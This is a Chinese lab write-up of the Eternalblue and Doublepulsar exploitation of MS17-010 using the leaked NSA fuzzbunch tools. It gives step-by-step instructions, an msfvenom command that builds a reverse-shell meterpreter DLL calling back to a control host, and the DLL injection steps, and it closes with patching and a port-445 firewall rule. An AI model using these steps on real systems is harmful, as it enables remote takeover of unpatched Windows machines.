---
title: NSA Enternalblue + Doublepulsar 复现 SMB 漏洞
date: 2017-04-27 17:18:08
tags: [Enternalblue,Doublepulsar,NSA,SMB,Metasploit]
categories: Exploit
keywords: [Enternalblue,Doublepulsar,NSA,SMB,Metasploit]
---

2017年4月14日，Shadow Brokers 再次公开了大量从 NSA 的方程式组织（Equation Group）处窃取的攻击工具，这些工具主要针对 Windows 系统的漏洞，其中还有几个 0 day。工具中的 fuzzbunch 是一个类似于 metasploit 的漏洞利用框架，fb.py 是 fuzzbunch 的入口文件，通过该文件可以调用各攻击模块。

泄露的工具可在 Github 下载：<https://github.com/misterch0c/shadowbroker>

### **0x01 影响范围**

下图中列举了工具中相关模块所影响的服务和系统。
![](http://ooyovxue7.bkt.clouddn.com/17-4-28/92526918-file_1493343199647_16966.jpg)

### **0x02 漏洞测试**
下面使用工具中的 fuzzbunch 框架、Eternalblue 和 Doublepulsar 测试 Windows 下的 SMB 漏洞。首先通过 Eternalblue 利用 MS17-010 漏洞攻击 Windows 系统；然后在 Kali Linux 中用 Metasploit 生成一个能建立反向连接的 DLL，并在 Kali 中监听相应端口；最后使用 Doublepulsar 远程注入恶意 DLL 到目标系统，注入成功后 Kali 将与目标系统建立连接。

#### **1. 测试环境**

|     PC     |       IP        |  用途  |        备注        |
|:---------- |:--------------- | ------ | ------------------ |
| Win 7 x64  | 192.168.109.1   | 攻击机 | 需安装 [python2.6](https://www.python.org/ftp/python/2.6.6/python-2.6.6.msi)  和 [pywin32](https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download) |
| Win 7 x86  | 192.168.109.132 | 靶机   |开启 SMB 服务（445端口）   |
| Kali Linux | 192.168.109.128 | 控制端   | 生成payload 并控制回连会话|
首先需要把工具中的 windows 拷贝到攻击机 Win 7 x64中，然后在 windows 目录下新建一个 listeningposts 文件夹。

#### **2. 测试流程**
##### **1）运行 fuzzbunch 框架**
在 cmd 中进入 windows 目录，运行 `python fb.py`。输入目标系统 IP（Win 7 x86）和攻击机 IP（Win 7 x64），输入“no” 不重定向，接着输入项目名新建一个项目。
![](http://ooyovxue7.bkt.clouddn.com/17-4-28/95094523-file_1493344655277_8614.png)

##### **2）调用 Eternalblue 攻击系统**
运行` use Eternalblue`，然后大多数步骤只需按回车使用默认参数即可。
![](http://ooyovxue7.bkt.clouddn.com/17-4-28/54184530-file_1493344922256_adf5.png)
下面需要选择 `1）FB` 模式。
![](http://ooyovxue7.bkt.clouddn.com/17-4-28/61786740-file_1493345114952_f2f3.png)
接着继续回车，直到成功运行攻击模块。
![](http://ooyovxue7.bkt.clouddn.com/17-4-28/73280707-file_1493345362094_157db.png)

##### **3）Metasploit 生成恶意 DLL**
在 Kali Linux 下使用 Metasploit 生成恶意 DLL,它将在目标系统中建立一个反向连接。这里生成的 DLL必须要与目标系统版本一致，下面生成 32 bit 的 DLL。
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.109.128 LPORT=6666 -f dll > test.dll
```
之后需要将生成的 test.dll 拷贝到攻击机的 D:\\下。

##### **4）开启 msf 监听**
在 Kali Linux 下，运行 msf，监听 6666 端口。
![](http://ooyovxue7.bkt.clouddn.com/17-4-28/80220500-file_1493346556508_101d9.png)

##### **5）调用 Doublepulsar 注入 DLL**
回到攻击机中，执行 `use Doublepulsar` ，回车使用默认参数直到选择 Function 为2 注入 DLL，然后指定 DLL 的路径。
![](http://ooyovxue7.bkt.clouddn.com/17-4-28/11038492-file_1493347262266_5c5.png)
注入成功后将返回如下信息。
![](http://ooyovxue7.bkt.clouddn.com/17-4-28/68357990-file_1493347997057_2e1f.png)
但是这里也会出现个问题，多次注入之后目标系统会出错重启。
![](http://ooyovxue7.bkt.clouddn.com/17-4-28/56721083-file_1493348716416_6f00.png)

##### **6）建立连接**
DLL 注入到目标系统之后，Kali Linux 将与目标系统建立连接。
![](http://ooyovxue7.bkt.clouddn.com/17-4-28/82624178-file_1493348105266_34db.png)

### **0x03 防御措施**
#### **1. 尽快升级系统补丁**

#### **2. 开启防火墙，并限制 445 端口**
通过以下命令添加防火墙规则：
```
netsh advfirewall firewall add rule name="445" protocol=TCP dir=in localport=445 action=block
```
----
References:   
[1] [NSA工具包之0day Eternalblue 复现笔记](http://blog.injectxx.com/2017/04/18/%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0%E3%80%82/)   
[2] [HOW TO EXPLOIT ETERNALBLUE & DOUBLEPULSAR TO GET AN
EMPIRE/METERPRETER SESSION ON WINDOWS 7/2008](https://www.exploit-db.com/docs/41896.pdf)   
[3] [NSA Fuzzbunch分析与利用案例](https://www.vulbox.com/knowledge/detail/?id=6)
